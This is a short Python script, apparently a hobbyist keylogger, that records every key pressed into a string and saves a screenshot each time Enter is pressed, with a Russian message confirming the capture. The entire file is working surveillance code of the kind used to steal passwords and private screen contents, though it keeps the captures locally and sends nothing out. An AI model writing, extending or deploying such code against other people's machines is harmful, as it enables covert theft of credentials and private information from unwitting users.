import keyboard
from PIL import ImageGrab

session = 1
def keylogger():
    text = ''
    while True:
        event = keyboard.read_event()
        if event.event_type == "down":
            print(event.name)
            text += event.name
            print(text)

def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save("screenshot.png")
    print("Скриншот сохранен")

def on_key(event):
    if event.name == "enter":
        take_screenshot()

keyboard.on_press(on_key)
keyboard.wait('esc')


keylogger()
